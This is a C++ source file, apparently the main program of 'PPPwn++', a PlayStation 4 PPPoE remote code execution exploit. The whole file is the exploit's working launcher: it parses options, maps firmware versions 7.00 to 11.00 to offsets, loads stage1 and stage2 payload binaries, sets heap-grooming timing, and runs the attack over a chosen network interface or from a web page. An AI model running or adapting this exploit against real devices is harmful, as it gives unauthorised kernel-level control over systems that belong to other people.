#include <iostream>
#include <fstream>
#include <unordered_map>
#include <vector>
#include <string>
#include <PcapLiveDeviceList.h>
#include <clipp.h>

#if defined(__APPLE__)

#include <SystemConfiguration/SystemConfiguration.h>

#endif

#include "exploit.h"
#include "web.h"

std::vector<uint8_t> readBinary(const std::string &filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cout << "[-] Cannot open: " << filename << std::endl;
        return {};
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(size);
    if (!file.read(reinterpret_cast<char *>(buffer.data()), size)) {
        std::cout << "[-] Cannot read: " << filename << std::endl;
        return {};
    }

    return buffer;
}

void listInterfaces() {
    std::cout << "[+] interfaces: " << std::endl;
#if defined(__APPLE__)
    CFArrayRef interfaces = SCNetworkInterfaceCopyAll();
    if (!interfaces) {
        std::cerr << "[-] Failed to get interfaces" << std::endl;
        exit(1);
    }
    CFIndex serviceCount = CFArrayGetCount(interfaces);
    char buffer[1024];
    for (CFIndex i = 0; i < serviceCount; ++i) {
        auto interface = (SCNetworkInterfaceRef) CFArrayGetValueAtIndex(interfaces, i);
        auto serviceName = SCNetworkInterfaceGetLocalizedDisplayName(interface);
        auto bsdName = SCNetworkInterfaceGetBSDName(interface);
        if (bsdName) {
            CFStringGetCString(bsdName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
            printf("\t%s ", buffer);
            if (serviceName) {
                CFStringGetCString(serviceName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
                printf("%s", buffer);
            }
            printf("\n");
        }
    }
    CFRelease(interfaces);
#else
    std::vector<pcpp::PcapLiveDevice *> devList = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();
    for (pcpp::PcapLiveDevice *dev: devList) {
        if (dev->getLoopback()) continue;
        std::cout << "\t" << dev->getName() << " " << dev->getDesc() << std::endl;
    }
#endif
    exit(0);
}

enum FirmwareVersion getFirmwareOffset(int fw) {
    std::unordered_map<int, enum FirmwareVersion> fw_choices = {
            {700,  FIRMWARE_700_702},
            {701,  FIRMWARE_700_702},
            {702,  FIRMWARE_700_702},
            {750,  FIRMWARE_750_755},
            {750,  FIRMWARE_750_755},
            {751,  FIRMWARE_750_755},
            {755,  FIRMWARE_750_755},
            {800,  FIRMWARE_800_803},
            {801,  FIRMWARE_800_803},
            {803,  FIRMWARE_800_803},
            {850,  FIRMWARE_850_852},
            {852,  FIRMWARE_850_852},
            {900,  FIRMWARE_900},
            {903,  FIRMWARE_903_904},
            {904,  FIRMWARE_903_904},
            {950,  FIRMWARE_950_960},
            {951,  FIRMWARE_950_960},
            {960,  FIRMWARE_950_960},
            {1000, FIRMWARE_1000_1001},
            {1001, FIRMWARE_1000_1001},
            {1050, FIRMWARE_1050_1071},
            {1070, FIRMWARE_1050_1071},
            {1071, FIRMWARE_1050_1071},
            {1100, FIRMWARE_1100}
    };
    if (fw_choices.count(fw) == 0) return FIRMWARE_UNKNOWN;
    return fw_choices[fw];
}

#define SUPPORTED_FIRMWARE "{700,701,702,750,751,755,800,801,803,850,852,900,903,904,950,951,960,1000,1001,1050,1070,1071,1100} (default: 1100)"

static std::shared_ptr<Exploit> exploit = std::make_shared<Exploit>();
static std::shared_ptr<WebPage> web = nullptr;

static void signal_handler(int sig_num) {
    signal(sig_num, signal_handler);
    if (web) web->stop();
    exploit->ppp_byebye();
    exit(sig_num);
}

int main(int argc, char *argv[]) {
    using namespace clipp;
    std::cout << "[+] PPPwn++ - PlayStation 4 PPPoE RCE by theflow" << std::endl;
    std::string interface, stage1 = "stage1/stage1.bin", stage2 = "stage2/stage2.bin";
    std::string web_url = "0.0.0.0:7796";
    int fw = 1100;
    int timeout = 0;
    int wait_after_pin = 1;
    int groom_delay = 4;
    int buffer_size = 0;
    bool retry = false;
    bool no_wait_padi = false;
    bool web_page = false;
    bool real_sleep = false;

    auto cli = (
            ("network interface" % required("-i", "--interface") & value("interface", interface), \
            SUPPORTED_FIRMWARE % option("--fw") & integer("fw", fw), \
            "stage1 binary (default: stage1/stage1.bin)" % option("-s1", "--stage1") & value("STAGE1", stage1), \
            "stage2 binary (default: stage2/stage2.bin)" % option("-s2", "--stage2") & value("STAGE2", stage2), \
            "timeout in seconds for ps4 response, 0 means always wait (default: 0)" %
            option("-t", "--timeout") & integer("seconds", timeout), \
            "Waiting time in seconds after the first round CPU pinning (default: 1)" %
            option("-wap", "--wait-after-pin") & integer("seconds", wait_after_pin), \
            "wait for 1ms every `n` rounds during Heap grooming (default: 4)" % option("-gd", "--groom-delay") &
            integer("1-4097", groom_delay), \
            "PCAP buffer size in bytes, less than 100 indicates default value (usually 2MB)  (default: 0)" %
            option("-bs", "--buffer-size") & integer("bytes", buffer_size), \
            "automatically retry when fails or timeout" % option("-a", "--auto-retry").set(retry), \
            "don't wait one more PADI before starting" % option("-nw", "--no-wait-padi").set(no_wait_padi), \
            "Use CPU for more precise sleep time (Only used when execution speed is too slow)" %
            option("-rs", "--real-sleep").set(real_sleep), \
            "start a web page" % option("--web").set(web_page), \
            "custom web page url (default: 0.0.0.0:7796)" % option("--url") & value("url", web_url)
            ) | \
            "list interfaces" % command("list").call(listInterfaces)
    );

    auto result = parse(argc, argv, cli);
    if (!result) {
        std::cout << make_man_page(cli, "pppwn");
        return 1;
    }

    auto offset = getFirmwareOffset(fw);
    if (offset == FIRMWARE_UNKNOWN) {
        std::cerr << "[-] Invalid firmware version" << std::endl;
        std::cout << make_man_page(cli, "pppwn");
        return 1;
    }

    std::cout << "[+] args: interface=" << interface << " fw=" << fw << " stage1=" << stage1 << " stage2=" << stage2
              << " timeout=" << timeout << " wait-after-pin=" << wait_after_pin << " groom-delay=" << groom_delay
              << " auto-retry=" << (retry ? "on" : "off") << " no-wait-padi=" << (no_wait_padi ? "on" : "off")
              << " real_sleep=" << (real_sleep ? "on" : "off")
              << std::endl;

    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (exploit->setFirmwareVersion((FirmwareVersion) offset)) return 1;
    if (exploit->setInterface(interface, buffer_size)) return 1;
    auto stage1_data = readBinary(stage1);
    if (stage1_data.empty()) return 1;
    auto stage2_data = readBinary(stage2);
    if (stage2_data.empty()) return 1;
    exploit->setStage1(std::move(stage1_data));
    exploit->setStage2(std::move(stage2_data));
    exploit->setTimeout(timeout);
    exploit->setWaitPADI(!no_wait_padi);
    exploit->setGroomDelay(groom_delay);
    exploit->setWaitAfterPin(wait_after_pin);
    exploit->setAutoRetry(retry);
    exploit->setRealSleep(real_sleep);

    if (web_page) {
        web = std::make_shared<WebPage>(exploit);
        web->setUrl(web_url);
        web->run();
        return 0;
    }

    return exploit->run();
}
